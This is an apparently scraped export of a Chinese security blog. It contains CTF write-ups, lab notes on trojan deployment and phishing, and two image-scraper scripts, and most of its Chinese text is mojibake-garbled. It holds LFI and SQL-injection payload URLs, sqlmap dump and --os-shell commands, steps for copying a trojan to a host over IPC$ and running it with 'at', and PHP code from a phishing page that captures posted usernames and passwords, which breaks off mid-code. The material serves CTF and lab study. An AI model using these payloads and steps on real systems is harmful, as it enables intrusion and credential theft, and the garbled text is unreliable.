å•èº«äºŒåå¹´tip:åœ¨è¿™é‡Œæ‰¾key ç‚¹å‡»å‘ç°urlæ”¹å˜ï¼Œè·³è½¬åˆ°äº†å¦ä¸€ä¸ªé¡µé¢ bpæŠ“åŒ…è¯•è¯•ï¼Œgoä¸€ä¸‹ï¼Œç›¸åº”åŒ…ä¸­å‡ºç°flag phpencodeä¸€å¼€å§‹ä»¥ä¸ºæ˜¯è§£ç ï¼Œç»“æœå‘ç°ä»£ç é€»è¾‘ä¸å¯¹ï¼Œç›´æ¥è¿è¡Œphpä»£ç ï¼Œå‡ºé”™ å°†æœ€åçš„evalæ”¹ä¸ºecho,æäº¤è¿è¡Œå³å¯ LFI é»‘ç›’åˆ¤æ–­æ–¹æ³•ï¼šå•çº¯çš„ä»URLåˆ¤æ–­çš„è¯ï¼ŒURLä¸­pathã€dirã€fileã€pagã€pageã€archiveã€pã€engã€è¯­è¨€æ–‡ä»¶ç­‰ç›¸å…³å…³é”®å­—çœ¼çš„æ—¶å€™,å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚ æ ¹æ®PHPä¼ªåè®®å°è¯•æ„é€ å¦‚ä¸‹Payloadï¼š?file=php://filter/read=convert.base64-encode/resource=index.phpï¼Œå°†index.phpçš„æºç ç»è¿‡Base64ç¼–ç è¾“å‡º PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4= base64è§£ç  1234567891011121314&lt;html&gt; &lt;title&gt;asdf&lt;&#x2F;title&gt;&lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125; $file&#x3D;$_GET[&#39;file&#39;]; if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); &#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;&#x2F;html&gt; å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨ä¸å•èº«äºŒåå¹´ä¸€æ ·ï¼ŒæŠ“åŒ…å³å¯ cookie Cookieï¼Œæœ‰æ—¶ä¹Ÿç”¨å…¶å¤æ•°å½¢å¼ Cookiesã€‚ç±»å‹ä¸ºâ€œå°å‹æ–‡æœ¬æ–‡ä»¶â€ï¼Œæ˜¯æŸäº›ç½‘ç«™ä¸ºäº†è¾¨åˆ«ç”¨æˆ·èº«ä»½ï¼Œè¿›è¡ŒSessionè·Ÿè¸ªè€Œå‚¨å­˜åœ¨ç”¨æˆ·æœ¬åœ°ç»ˆç«¯ä¸Šçš„æ•°æ®ï¼ˆé€šå¸¸ç»è¿‡åŠ å¯†ï¼‰ï¼Œç”±ç”¨æˆ·å®¢æˆ·ç«¯è®¡ç®—æœºæš‚æ—¶æˆ–æ°¸ä¹…ä¿å­˜çš„ä¿¡æ¯ ã€‚ TIP: 0==not bpæŠ“åŒ…ï¼Œå°†cookie:login = 0æ”¹cookie:login=1 go MYSQLè¿›å…¥é¢˜ç›®ï¼Œæç¤ºrobotsåè®® robotsåè®®ä¹Ÿå«robots.txtï¼ˆç»Ÿä¸€å°å†™ï¼‰æ˜¯ä¸€ç§å­˜æ”¾äºç½‘ç«™æ ¹ç›®å½•ä¸‹çš„ASCIIç¼–ç çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé€šå¸¸å‘Šè¯‰ç½‘ç»œæœç´¢å¼•æ“çš„æ¼«æ¸¸å™¨ï¼ˆåˆç§°ç½‘ç»œèœ˜è››ï¼‰ï¼Œæ­¤ç½‘ç«™ä¸­çš„å“ªäº›å†…å®¹æ˜¯ä¸åº”è¢«æœç´¢å¼•æ“çš„æ¼«æ¸¸å™¨è·å–çš„ï¼Œå“ªäº›æ˜¯å¯ä»¥è¢«æ¼«æ¸¸å™¨è·å–çš„ã€‚å› ä¸ºä¸€äº›ç³»ç»Ÿä¸­çš„URLæ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œæ‰€ä»¥robots.txtçš„æ–‡ä»¶ååº”ç»Ÿä¸€ä¸ºå°å†™ã€‚robots.txtåº”æ”¾ç½®äºç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ã€‚å¦‚æœæƒ³å•ç‹¬å®šä¹‰æœç´¢å¼•æ“çš„æ¼«æ¸¸å™¨è®¿é—®å­ç›®å½•æ—¶çš„è¡Œä¸ºï¼Œé‚£ä¹ˆå¯ä»¥å°†è‡ªå®šçš„è®¾ç½®åˆå¹¶åˆ°æ ¹ç›®å½•ä¸‹çš„robots.txtï¼Œæˆ–è€…ä½¿ç”¨robotså…ƒæ•°æ®ï¼ˆMetadataï¼Œåˆç§°å…ƒæ•°æ®ï¼‰ã€‚ robotsåè®®å¹¶ä¸æ˜¯ä¸€ä¸ªè§„èŒƒï¼Œè€Œåªæ˜¯çº¦å®šä¿—æˆçš„ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½ä¿è¯ç½‘ç«™çš„éšç§ã€‚ æŸ¥çœ‹robots.txt url:http://chinalover.sinaapp.com/web11/robots.txt 12TIP:sql.php//è¿™é‡Œæç¤ºsql.phpçš„æºç å¦‚ä¸‹ 1234567891011121314&lt;?phpif($_GET[id]) &#123; mysql_connect(SAE_MYSQL_HOST_M . ':' . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $id = intval($_GET[id]); $query = @mysql_fetch_array(mysql_query(\"select content from ctf2 where id='$id'\")); if ($_GET[id]==1024) &#123; echo \"&lt;p&gt;no! try again&lt;/p&gt;\"; &#125; else&#123; echo($query[content]); &#125;&#125;?&gt; å¤§è‡´æ„æ€ï¼šgetæ–¹å¼ä¼ é€’ä¸€ä¸ªidçš„å‚æ•°,åˆ›å»ºä¸€ä¸ªæ–°çš„å‚æ•°idå­˜æ”¾å–æ•´åçš„å€¼ï¼ˆintval()å‡½æ•°å°†å‚æ•°å˜ä¸ºæ•´å½¢ï¼‰ ä¹‹åå°†æ–°çš„$idå¸¦å…¥sqlè¯­å¥ä¸­æŸ¥è¯¢ã€‚ifè¯­å¥ä¸­è¯´æ˜ï¼Œgetæ–¹å¼ä¼ é€’çš„å€¼ä¸èƒ½ä¸º1024ã€‚ http://chinalover.sinaapp.com/web11/sql.php?id=10 å°è¯•id=10ï¼Œæ— ç»“æœ id=1024å‡ºç° no! try againï¼Œè¯´æ˜åªæœ‰id=1024çš„æ—¶å€™æ‰ä¼šæ‰§è¡Œifè¯­å¥ æƒ³åˆ°äº†intval()å‡½æ•°çš„ä½œç”¨ï¼Œå°è¯•id=1024.1 GBK Injectionå®½å­—èŠ‚æ³¨å…¥ï¼Œä¹‹å‰å†™è¿‡ã€‚ /x0012345678if (isset ($_GET['nctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['nctf']) === FALSE) echo 'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'; else if (strpos ($_GET['nctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo 'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'; &#125; è¯•äº†è¯•?nctf[]=1,å‡ºç°äº†æŠ¥é”™ä½†æ˜¯ç­”æ¡ˆçœŸå°±å‡ºæ¥äº† æ­£å„¿å…«ç»çš„åšæ³•æ˜¯?nctf=1%00%23biubiubiuï¼Œç®€å•çš„ä»£ç å®¡è®¡ bypass again12345678910&lt;?phpif (isset($_GET['a']) and isset($_GET['b']))&#123;if ($_GET['a'] != $_GET['b'])if (md5($_GET['a']) == md5($_GET['b']))die('Flag: '.$flag);elseprint 'Wrong.';&#125; ?&gt; ä»£ç å®¡è®¡ï¼Œgetæ–¹å¼ä¼ é€’å‚æ•°aå’Œb,äºŒè€…çš„å€¼ä¸åŒï¼Œä½†æ˜¯md5å€¼ä¸åŒï¼Œæ­¤å¤„åˆåˆ©ç”¨md5()æ¼æ´ åœ¨PHPä¸­ï¼ŒMD5æ˜¯ä¸èƒ½å¤„ç†æ•°ç»„çš„ï¼Œmd5(æ•°ç»„)ä¼šè¿”å›nullï¼Œæ‰€ä»¥md5(a[])null,md5(b[])nullï¼Œmd5(a[])=md5(b[])=null,è¿™æ ·å°±å¾—åˆ°ç­”æ¡ˆäº†ã€‚ payload: http://chinalover.sinaapp.com/web17/index.php?a[]=1&amp;b[]=3 ä¼ªè£…è€…bpæŠ“åŒ…ï¼Œæ·»åŠ X-Forwarded-For=127.0.0.1,å‘åŒ…å³å¯ X-Forwarded-Forï¼ˆXFFï¼‰æ˜¯ç”¨æ¥è¯†åˆ«é€šè¿‡HTTPä»£ç†æˆ–è´Ÿè½½å‡è¡¡æ–¹å¼è¿æ¥åˆ°WebæœåŠ¡å™¨çš„å®¢æˆ·ç«¯æœ€åŸå§‹çš„IPåœ°å€çš„HTTPè¯·æ±‚å¤´å­—æ®µ","tags":[{"name":"md5","slug":"md5","permalink":"https://sunzhengyu99.github.io/tags/md5/"},{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://sunzhengyu99.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"bypass","slug":"bypass","permalink":"https://sunzhengyu99.github.io/tags/bypass/"}]},{"title":"SSTI","date":"2020-08-16T14:08:06.000Z","path":"2020/08/16/SSTI/","text":"https://www.cnblogs.com/wangtanzhi/p/12238779.html","tags":[{"name":"STTI","slug":"STTI","permalink":"https://sunzhengyu99.github.io/tags/STTI/"}]},{"title":"Bugku","date":"2020-08-08T14:40:51.000Z","path":"2020/08/08/Bugku/","text":"Bugkuåˆ·é¢˜ æˆç»©å•1231' and 1=1 # 1' and 1=2 # ä¸æ˜¾ç¤ºå†…å®¹ï¼Œå¯ä»¥åˆ¤æ–­å­˜åœ¨æ³¨å…¥ç‚¹ æ‰‹å·¥æ³¨å…¥1.1&#39; order by 4#å¯æ­£å¸¸æ˜¾ç¤ºå¯ä»¥åˆ¤æ–­å­˜åœ¨å››ä¸ªå­—æ®µ2.çˆ†æ•°æ®åº“` -1&apos; union select 1,database(),3,4 #` database:skctf_flag3.çˆ†å‡ºè¡¨å-1&apos; union select 1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4 # table:fl4g,sc 4.å­—æ®µå-1&apos; union select 1,(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where`TABLE_NAME=&quot;fl4g&quot;),3,4 # skctf_flag å¾—åˆ°flag (select skctf_flag from skctf_flag.fl4g) sqlmap å› ä¸ºæœ¬é¢˜æäº¤æ•°æ®çš„æ–¹å¼ä¸ºpostï¼Œæ•…éœ€è¦å…ˆç”¨bpæŠ“æ•°æ®åŒ…ï¼Œä¿å­˜åˆ°sqlmapçš„è·¯å¾„ä¸­ 1.è·å–æ•°æ®åº“python2 sqlmap.py -r a.txt --dbs 2.è·å–è¡¨åpython2 sqlmap.py -r a.txt -D skctf_flag --tables 3.è·å–åˆ—åpython2 sqlmap.py -r a.txt -D skctf_flag -T fl4g --columns 4.è·å–flagpython2 sqlmap.py -r a.txt -D skctf_flag -T fl4g -C skctf_flag --dump å¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ æ‰«æå‘ç°äº†index.phpï¼Œé€šè¿‡ index.php.bakä¸‹è½½ç½‘é¡µæºç  123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;echo $flag.\"å–å¾—flag\";&#125;?&gt; å¯¹ä¸Šä¼ çš„å€¼è¿›è¡Œäº†è¿‡æ»¤key, kekeyyå¯ä»¥ç»•è¿‡ 1.md5å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå°†ä¸¤ä¸ªå‚æ•°è®¾ç½®ä¸ºæ•°ç»„ç±»å‹ç»è¿‡md5å‡½æ•°åŠ å¯†åéƒ½ä¸ºNULLæ•…äºŒè€…ç›¸ç­‰ payload: ?kekey1[]=da&amp;kekey2[]=dada 2.åˆ©ç”¨==æ¯”è¾ƒæ¼æ´ å¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚ ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a å¤šæ¬¡çˆ†æ•°æ®åº“å http://123.206.87.240:9004/1ndex.php?id=-1&#39; ununionion seselectlect 1,database() --+ database:web1002-1 çˆ†è¡¨å http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() --+flag1,hint çˆ†å­—æ®µå http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name= &apos;flag1&apos; --+flag1,addressè·å–å†…å®¹ http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(flag1) from flag1 --+usOwycTju+FTUUzXosjr æäº¤å‘ç°ä¸å¯¹ http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+è·å–addressä¸­çš„å†…å®¹ ./Once_More.phpä¸‹ä¸€å…³åœ°å€å¾—åˆ°å¦å¤–ä¸€ä¸ªåœ°å€ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23ç»™å‡ºæç¤ºXPATH syntax error: â€˜class,flag2â€˜ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23Unknown column â€˜flag2â€™ in â€˜where clauseâ€™ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23XPATH syntax error: â€˜flag{Bugku-sql_6s-2i-4t-bug}â€˜ ï¼ï¼ï¼æ³¨æ„æŠŠflagæ”¹ä¸ºå°å†™å­—æ¯ å®½å­—èŠ‚æ³¨å…¥é¶åœºï¼šhttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 ä¸€ã€æ‰‹å·¥æ³¨å…¥ç¬¬ä¸€æ­¥ http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27åŠ å•å¼•å·æŠ¥é”™ http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,table_name from information_schema.tables where table_schema=database()%23æŸ¥çœ‹æ‰€æœ‰çš„è¡¨ http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23æŸ¥çœ‹è¡¨ä¸­çš„åˆ— http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23 ctf,ctf2,ctf3,ctf4,gbksqli,news0x637466 ä¸ºåå…­è¿›åˆ¶ctf è·å–å­—æ®µå†…å®¹ http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(pw) from ctf %23flag:nctf{h4cked_By_w00dPeck3r} äºŒã€sqlmapæ³¨å…¥æ£€æµ‹æ˜¯å¦æœ‰æ³¨å…¥ç‚¹ sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27æ²¡æœ‰æˆåŠŸä½¿ç”¨åå…­è¿›åˆ¶ sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hexè·å–æ•°æ®åº“å sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --dbs //é€‰æ‹©åå…­è¿›åˆ¶ è·å–æ•°æ®åº“å å•å¼•å·ä½¿ç”¨urlç¼–ç è·å–è¡¨å sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --D sae-chinalover --tablesè·å–flag sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex -D sae-chinalover -T ctf --dump","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"æœ¨é©¬","date":"2020-07-18T12:34:10.000Z","path":"2020/07/18/æœ¨é©¬/","text":"åˆè¯†æœ¨é©¬ å®éªŒç›®çš„ä½¿ç”¨ç°é¸½å­è½¯ä»¶ä»¥åŠç«¯å£çˆ†ç ´è½¯ä»¶æ§åˆ¶ç›®çš„ä¸»æœº å‡†å¤‡ä¸€å°xpï¼Œä¸€å°2003å…¶ä¸­xpåœ°å€ä¸º10.1.1.3/24 2003ä¸º10.1.1.1/24ä½¿ä¸¤ä¸ªä¸»æœºèƒ½å¤Ÿé€šä¿¡xpä½œä¸ºæ”»å‡»æ–¹ï¼Œ2003ä¸ºå—å®³è€… 1.åˆ¶ä½œæœ¨é©¬ä½¿ç”¨ç°é¸½å­åˆ¶ä½œæœ¨é©¬ï¼Œå°†æœ¨é©¬ç”Ÿæˆåœ¨åœ¨æ¡Œé¢ï¼ˆè®°ä½è·¯å¾„ä¹‹åè¦ä½¿ç”¨ï¼‰ 2.æ‰«æä¸»æœºï¼Œå¹¶å¯¹è´¦å·å¯†ç è¿›è¡Œçˆ†ç ´ipèµ·å§‹åœ°å€ä¸º10.1.1.1-10.1.1.255å¯†ç é…ç½®æ–‡ä»¶å…¶å®åªè¦æ‰«æ10.1.1.1å³å¯ï¼ˆå› ä¸ºæ˜¯å®éªŒï¼‰ è·å–è´¦å·å¯†ç usernameï¼šadministratorpassword: â€œâ€ 3.ä¸ç›®æ ‡ä¸»æœºå»ºç«‹IPC$net use \\\\10.1.1.1\\ipc$ &quot;&quot; \\user:administrator 4.æ¤å…¥æœ¨é©¬åˆ°ç›®æ ‡ä¸»æœºcopy C:\\Documents and Settings\\shimisi\\æ¡Œé¢\\qq.exe \\\\10.1.1.1\\ipc$ 5.è®¾ç½®ç›®æ ‡ä¸»æœºè¿è¡Œæœ¨é©¬net time \\\\10.1.1.1æ ¹æ®ç›®æ ‡ä¸»æœºæ—¶é—´è®¾ç½®äº‹ç‰©çš„å¼€å§‹æ—¶é—´at \\\\10.1.1.1 17:17 c:\\qq.exeåœ¨ä¸Šé¢çš„æ—¶é—´ä¹‹åä¸‰åˆ†é’Ÿå·¦å³è®¾ç½®ä¸€ä¸ªäº‹ç‰©å³åœ¨17ï¼š17æ—¶è¿è¡Œæœ¨é©¬æ–‡ä»¶ 6.æˆåŠŸæ§åˆ¶ç›®æ ‡ä¸»æœºè§‚å¯Ÿç›®æ ‡ä¸»æœºå·²è‡ªåŠ¨ä¸Šçº¿ï¼Œå·²å¯ä»¥è¿›è¡Œç›‘æ§æˆ–ä¼ è¾“æ•°æ®ç­‰æ“ä½œ è·å–å±å¹•å†…å®¹ æ§åˆ¶å‘½ä»¤è¡Œ","tags":[]},{"title":"jdtest","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/jdtest/","text":"çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯• è®¿é—®çš„é¡µé¢å›¾ç‰‡é“¾æ¥çš„ä½ç½® 123456789101112131415161718192021222324252627282930313233# -*- coding = utf - 8 -*-#@Time : 2020/7/16 14:54#@Author : sunzy#@File : jd.pyimport reimport requestsimport timeimport osdir = \"jdtp\"if not os.path.exists(dir): os.mkdir(dir)baseurl = \"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu\"head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125;response = requests.get(url=baseurl, headers = head)#print(response.text)html = response.textfindlinks = '&lt;img width=\"220\" height=\"220\" data-img=\"\\d\" src=\"(.*?)\".*?&gt;'#&lt;img width=\"220\" height=\"220\" data-img=\"1\" src=\"//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg\" data-lazy-img=\"done\" source-data-lazy-img=\"\"&gt;urls = re.findall(findlinks, html)for url in urls: time.sleep(1) file_name = url.split('/')[-1] res = requests.get(\"http:\"+url,headers = head) with open(dir+'/'+file_name, \"wb\") as f: f.write(res.content)","tags":[{"name":"python","slug":"python","permalink":"https://sunzhengyu99.github.io/tags/python/"}]},{"title":"sqlmap","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/sqlæ³¨å…¥/","text":"sqlmapä½¿ç”¨ ç¬¬ä¸€æ­¥: -u &quot;xxâ€ --cookie= &quot;yyy&quot; //å¸¦ä¸Šcookieå¯¹URLè¿›è¡Œæ³¨å…¥æ¢æµ‹ç¬¬äºŒæ­¥: -u &quot;xxxâ€ --cookie= &quot;yy&quot; - current--db //å¯¹æ•°æ®åº“åè¿›è¡Œè·å–ç¬¬ä¸‰æ­¥: -u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //å¯¹æ•°æ®åº“dvwaçš„è¡¨åè¿›è¡Œæšä¸¾ç¬¬å››æ­¥: -u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //å¯¹dvwaåº“é‡Œé¢çš„åä¸ºusersè¡¨çš„åˆ—åè¿›è¡Œæšä¸¾ç¬¬äº”æ­¥: -u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump //æ¢æµ‹userè¡¨nameå’Œpasswordå­—æ®µå¦‚æœæ­¤æ—¶å¾—åˆ°çš„å¯†ç ä¸ºå¯†æ–‡, SQLmapä¼šè‡ªåŠ¨è¯¢é—®ï¼Œæ˜¯å¦çˆ†ç ´,é€‰æ‹©â€æ˜¯â€å³å¯å¼€å§‹ä½¿ç”¨SQLMAPè‡ªå¸¦çš„å­—å…¸è¿›è¡Œçˆ†ç ´ã€‚ ç¬¬å…­æ­¥: -u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //è·å–shell,é€‰æ‹©åå°è¯­è¨€sqlæ³¨å…¥order by * group by * åˆ©ç”¨å†…ç½®å‡½æ•°æš´æ•°æ®åº“ä¿¡æ¯ version() æŸ¥çœ‹æ•°æ®åº“ç‰ˆæœ¬ database() æŸ¥çœ‹å½“å‰æ•°æ®åº“å user() æŸ¥çœ‹å½“å‰ç”¨æˆ· æŸ¥çœ‹è¡¨ï¼š Select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() å¯åå…­è¿›åˆ¶æŸ¥çœ‹å­—æ®µï¼š select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=â€˜biaomingâ€™;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"çˆ¬å›¾","date":"2020-07-18T09:40:51.000Z","path":"2020/07/18/çˆ¬å›¾/","text":"ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡ ç”¨çš„åº“ 1234re #æ­£åˆ™è¡¨è¾¾å¼requests #urlè¯·æ±‚time #æ—¶é—´os #ç”¨äºåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œä¿å­˜å›¾ç‰‡ ##å‡†å¤‡å·¥ä½œ1.é¦–å…ˆè®¿é—®è¯¥é“¾æ¥https://www.vmgirls.com/2.éšä¾¿ç‚¹å‡»ä¸€ä¸ªè¿›å…¥æŸ¥çœ‹è¯¦æƒ…https://www.vmgirls.com/13344.html3.F12å®¡æŸ¥å…ƒç´ ç½‘æŸ¥çœ‹é¡µè¯¦æƒ…ï¼Œä¸»è¦æŸ¥çœ‹å›¾ç‰‡é“¾æ¥çš„æ ‡ç­¾ä½ç½®ï¼Œå†™å‡ºæ­£åˆ™è¡¨è¾¾å¼è¯¥æ­£åˆ™è¡¨è¾¾å¼ä¸ºfindlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39; å®Œæ•´ç¨‹åº12345678910111213141516171819202122232425262728293031# -*- coding = utf - 8 -*-#@Time : 2020/7/16 13:36#@Author : sunzy#@File : tupian.pyimport reimport requestsimport timeimport osdir = \"plmm\" #æ–‡ä»¶å¤¹åå­—if not os.path.exists(dir): #é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨å½“å‰æ–‡ä»¶å¤¹å¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ª os.mkdir(dir)# æ¨¡ä»¿æµè§ˆå™¨çš„é¦–éƒ¨ä¿¡æ¯ï¼Œç»•è¿‡ä¸€äº›ç½‘ç«™çš„åçˆ¬å–æªæ–½head = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61\" &#125;url = \"https://www.vmgirls.com/13344.html\"response = requests.get(url, headers = head) # è®¿é—®ç›®æ ‡ç½‘é¡µï¼Œè·å–ç½‘é¡µå†…å®¹html = response.textfindlinks = '&lt;a href=\"(.*?)\" alt=\".*?\" title=\".*?\"&gt;'urls = re.findall(findlinks, html) #çˆ¬å–åˆ°çš„å›¾ç‰‡é“¾æ¥ä¿å­˜åœ¨urlsä¸­ï¼Œ æ˜¯ä¸€ä¸ªåˆ—è¡¨for url in urls: time.sleep(1) #é˜²æ­¢è®¿é—®é€Ÿåº¦è¿‡å¿«ä½¿æœåŠ¡å™¨å´©æºƒ file_name = url.split('/')[-1] #ä¿å­˜å›¾ç‰‡çš„åå­— res = requests.get(url, headers = head) #ä¾æ­¤è®¿é—®å›¾ç‰‡é“¾æ¥ with open(dir+'/'+file_name, \"wb\") as f: #ä»¥äºŒè¿›åˆ¶å½¢å¼ä¿å­˜å›¾ç‰‡ f.write(res.content)","tags":[{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"diaoyu","date":"2020-07-18T09:37:15.000Z","path":"2020/07/18/diaoyu/","text":"DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ 1.å®éªŒç›®çš„è·å–ç™»å½•jdç½‘é¡µçš„ç”¨æˆ·åå’Œå¯†ç 2.å®éªŒä¸»æœºä¸€å°kali,ä¸¤å°win2003,å…¶ä¸­ä¸€å°ä¸ºå®¢æˆ·æœºï¼Œä¸€å°ä¸ºæœåŠ¡å™¨ï¼Œkaliä½œä¸ºæ”»å‡»è€…3.å®éªŒææ–™äº¬ä¸œç™»å½•ç½‘é¡µåŠå…¶æ‰€æœ‰å›¾ç‰‡ï¼ˆæµè§ˆå™¨è®¿é—®https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F ä¹‹åä¿å­˜ç½‘é¡µå³å¯ï¼‰ä¿®æ”¹index.htmlä¸­çš„å†…å®¹error.phpä¸­çš„å†…å®¹å¦‚ä¸‹å…³é”®ä»£ç ï¼ˆç”¨äºä¿å­˜ç”¨æˆ·åå’Œå¯†ç ä»¥åŠè¿·æƒ‘ç”¨æˆ·ï¼‰ 12345678910111213141516171819&lt;?php$nam = stripslashes($_POST['name']); //name æ˜¯ç”±ç½‘é¡µçš„è¡¨å•ä¿¡æ¯å†³å®šï¼Œä¸åŒçš„ç½‘é¡µå¯¹åº”ä¸åŒçš„å†…å®¹ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦$pas = stripslashes($_POST['pass']);//passä¹Ÿä¸€æ ·$content = 